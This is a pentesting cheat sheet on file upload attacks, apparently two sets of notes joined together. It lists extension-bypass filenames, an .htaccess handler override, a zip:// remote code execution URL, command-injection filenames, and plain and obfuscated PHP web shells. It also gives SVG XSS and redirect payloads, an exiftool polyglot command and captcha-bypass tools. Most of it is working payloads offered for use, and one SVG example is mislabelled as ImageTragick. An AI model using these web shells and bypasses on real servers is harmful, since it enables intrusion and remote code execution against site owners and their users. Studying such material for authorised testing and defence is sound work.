---

### **File Upload Vulnerabilities & Techniques**

#### **1. Basic Techniques**
- File Name Manipulation:
  - 02.mp3";id;#
  - Try uploading a text file with .png extension.
  - Try the same with .svg and inject XML: Video Tutorial (https://youtu.be/Iq6ThCmUTOU?si=-waZobykOkxOdf8L).
  - Try injecting XSS code in the file.

#### **2. Tools for Exploitation**
- Exif Tool: Manipulate metadata.
- jhead: Inject headers into image files.
- Video Tutorial: jhead (https://youtu.be/CmF9sEyKZNo?si=xpqlS0H2gpb7flmt).

#### **3. .htaccess File Manipulation**
- Add the following line to .htaccess:
  - AddType application/x-httpd-php .l33t
- Then upload a PHP file with .l33t extension.

#### **4. File Extension Bypass Techniques**
- file.jpg.{EXT}
- file.{EXT}.jpg
- file.{EXT}.xxxjpg
- file.{EXT}%00.jpg
- file.{EXT}\x00.jpg
- file.{EXT}%00
- file.{EXT}\x00
- file.{EXT}%20
- file.{EXT}%0d%0a.jpg
- file.{EXT}/
- file.{EXT}.\

#### **5. ZIP File Exploitation**
- Place RCE.php in a .zip file.
- Upload the .zip file.
- Access it via: http://www.target.com?file=zip://uploadedFile.zip%23RCE.php

#### **6. References**
- RCE Vulnerability in File Name: https://www.vaadata.com/blog/rce-vulnerability-in-a-file-name/
- Shell Uploading: https://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html
- File Upload Security Tips: https://security-tips.vincd.com/file-upload/
- Multipart Parsers Validation Bypass: https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/

---
- https://0xcybery.github.io/blog/hacking-with-pdf##Introduction
- 
------------

---

### **File Upload Vulnerabilities and Exploitation**

---

#### **1. File Extension Bypass**
- **Blacklisted Extensions**:  
  - PHP: `.phtm`, `.phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`  
  - ASP: `.asp`, `.aspx`, `.cer`, `.asa`  
  - JSP: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`  
  - ColdFusion: `.cfm`, `.cfml`, `.cfc`, `.dbm`  
  - Random capitalization: `.pHp`, `.pHP5`, `.PhAr`  

- **Whitelisted Extensions**:  
  - Double extensions: `file.jpg.php`, `file.php.jpg`  
  - Null byte injection: `file.php%00.jpg`, `file.php\x00.jpg`  
  - Trailing characters: `file.php.....`, `file.php/`, `file.php.\`  
  - Other tricks: `file.php%20`, `file.php%0d%0a.jpg`, `file.`, `.html`  

- **IIS (Windows)**: Upload `.asp` files using `.cer` or `.asa` extensions.  

---

#### **2. Payloads for File Upload**
- **PHP Web Shells**:  
  ```php
  <?php system($_GET["cmd"]);?>  // Usage: ?cmd=ls
  <?=`$_GET[0]`?>                // Usage: ?0=command
  <?=`$_POST[0]`?>               // Usage: POST with "0=command"
  <?=`{$_REQUEST['_']}`?>        // Usage: ?_=command or POST with "_=command"
  ```
- **Obfuscated PHP Payloads**:  
  ```php
  <?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`;?>
  <?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
  ```

---

#### **3. Content-Type Manipulation**
- **Preserve filename but change content-type**:  
  - Use `Content-Type: image/jpeg`, `image/gif`, or `image/png` for malicious files.  

---

#### **4. Impact by File Extension**
- **Web Shell/RCE**: `.asp`, `.aspx`, `.php5`, `.php`, `.php3`  
- **Stored XSS/SSRF/XXE**: `.svg`, `.gif`  
- **CSV Injection**: `.csv`  
- **XXE**: `.xml`  
- **LFI/SSRF**: `.avi`  
- **HTML Injection/XSS**: `.html`, `.js`  
- **Pixel Flood Attack (DoS)**: `.png`, `.jpeg`  
- **RCE via LFI/DoS**: `.zip`  
- **SSRF/Blind XXE**: `.pdf`, `.pptx`  

---

#### **5. File Name Exploitation**
- **Path Traversal**:  
  - Example: `../../etc/passwd/logo.png`, `../../../logo.png`  
- **SQL Injection**:  
  - Example: `sleep(10).jpg`, `sleep(10)-- -.jpg`  
- **Command Injection**:  
  - Example: `; sleep 10;`  
- **XSS**:  
  - Example: `<svg onload=alert(document.domain)>.svg`  

---

#### **6. Other Test Cases**
- **ImageTragick (SVG)**:  
  - Exploit SSRF or RCE via SVG file upload.  
  - Example:  
    ```xml
    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
      <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
      <script type="text/javascript">alert("XSS");</script>
    </svg>
    ```
- **Open Redirect via SVG**:  
  ```xml
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <svg onload="window.location='http://www.google.com'" xmlns="http://www.w3.org/2000/svg"></svg>
  ```

---

#### **7. Advanced Techniques**
- **Web Shell via `.htaccess`**:  
  - Upload `.htaccess` with:  
    ```plaintext
    AddType application/x-httpd-php .l33t
    ```  
  - Then upload a file with `.l33t` extension containing PHP code.  

- **Polyglot Web Shell**:  
  - Use `exiftool` to inject PHP code into an image:  
    ```bash
    exiftool -Comment="<?php echo 'START ' . 'Hacked By h0tak88r :)' . ' END'; ?>" download.png -o polyglot.php
    ```  

- **EXIF Data Not Stripped**:  
  - Upload images with EXIF data and check if it’s preserved.  
  - Use tools like [exif.regex.info](http://exif.regex.info/exif.cgi) to verify.  

---

#### **8. Top HackerOne Reports**
- **Remote Code Execution**:  
  - Example: Logo upload on `www.semrush.com/my_reports` (792 upvotes).  
- **Web Shell via File Upload**:  
  - Example: `ecjobs.starbucks.com.cn` (673 upvotes).  
- **Blind XSS**:  
  - Example: Image upload on CS Money (412 upvotes, $1000).  
- **Unrestricted File Upload**:  
  - Example: `ambassador.mail.ru` (404 upvotes, $3000).  
- **SSRF via File Upload**:  
  - Example: Video upload on TikTok (139 upvotes, $2727).  

---

#### **9. Tools and Resources**
- **OCR for Captcha Bypass**: [Tesseract](https://github.com/tesseract-ocr/tesseract)  
- **Online Captcha Solvers**: [Capsolver](https://www.capsolver.com/)  
- **EXIF Sample Images**: [GitHub Repository](https://github.com/ianare/exif-samples)  

---

- https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
